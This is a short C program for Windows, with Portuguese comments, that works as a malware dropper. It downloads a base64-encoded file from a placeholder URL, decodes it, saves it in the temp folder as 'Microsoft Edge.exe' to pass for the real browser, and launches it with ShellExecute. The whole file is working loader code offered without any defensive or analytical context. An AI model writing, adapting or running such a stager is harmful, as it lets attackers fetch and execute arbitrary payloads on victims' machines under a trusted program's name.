#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define URL "URL DO BINARIO"
#define TEMP_PATH "%TEMP%\\Microsoft Edge.exe"

// Função para decodificar base64
int base64_decode(const char *in, unsigned char *out) {
    const char *base64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int in_len = strlen(in);
    int out_len = (in_len / 4) * 3;
    
    if (in[in_len - 1] == '=') out_len--;
    if (in[in_len - 2] == '=') out_len--;
    
    for (int i = 0, j = 0; i < in_len;) {
        int a = (in[i] == '=' ? 0 : strchr(base64_table, in[i]) - base64_table);
        int b = (in[i + 1] == '=' ? 0 : strchr(base64_table, in[i + 1]) - base64_table);
        int c = (in[i + 2] == '=' ? 0 : strchr(base64_table, in[i + 2]) - base64_table);
        int d = (in[i + 3] == '=' ? 0 : strchr(base64_table, in[i + 3]) - base64_table);
        
        out[j++] = (a << 2) | (b >> 4);
        out[j++] = ((b & 0x0F) << 4) | (c >> 2);
        out[j++] = ((c & 0x03) << 6) | d;
        
        i += 4;
    }
    
    return out_len;
}

int main() {
    // Download do arquivo codificado em base64
    char temp_path[MAX_PATH];
    GetEnvironmentVariable("TEMP", temp_path, sizeof(temp_path));
    strcat(temp_path, "\\base64_file.txt");

    HRESULT hr = URLDownloadToFile(NULL, URL, temp_path, 0, NULL);
    if (hr != S_OK) {
        fprintf(stderr, "Erro ao baixar o arquivo.\n");
        return 1;
    }

    // Ler o arquivo baixado
    FILE *file = fopen(temp_path, "r");
    if (!file) {
        fprintf(stderr, "Erro ao abrir o arquivo baixado.\n");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *data = (char *)malloc(file_size + 1);
    if (!data) {
        fprintf(stderr, "Erro ao alocar memória.\n");
        fclose(file);
        return 1;
    }

    fread(data, 1, file_size, file);
    fclose(file);

    // Decodificar base64
    unsigned char *decoded_data = (unsigned char *)malloc(file_size * 3 / 4);
    if (!decoded_data) {
        fprintf(stderr, "Erro ao alocar memória para os dados decodificados.\n");
        free(data);
        return 1;
    }

    int decoded_size = base64_decode(data, decoded_data);

    // Salvar o arquivo decodificado no diretório TEMP
    char output_path[MAX_PATH];
    GetEnvironmentVariable("TEMP", output_path, sizeof(output_path));
    strcat(output_path, "\\Microsoft Edge.exe");

    file = fopen(output_path, "wb");
    if (file) {
        fwrite(decoded_data, 1, decoded_size, file);
        fclose(file);
        
        // Executar o arquivo salvo
        ShellExecute(NULL, "open", output_path, NULL, NULL, SW_SHOWNORMAL);
    } else {
        fprintf(stderr, "Erro ao salvar o arquivo decodificado.\n");
        free(decoded_data);
        free(data);
        return 1;
    }

    // Limpeza de memória
    free(decoded_data);
    free(data);

    return 0;
}
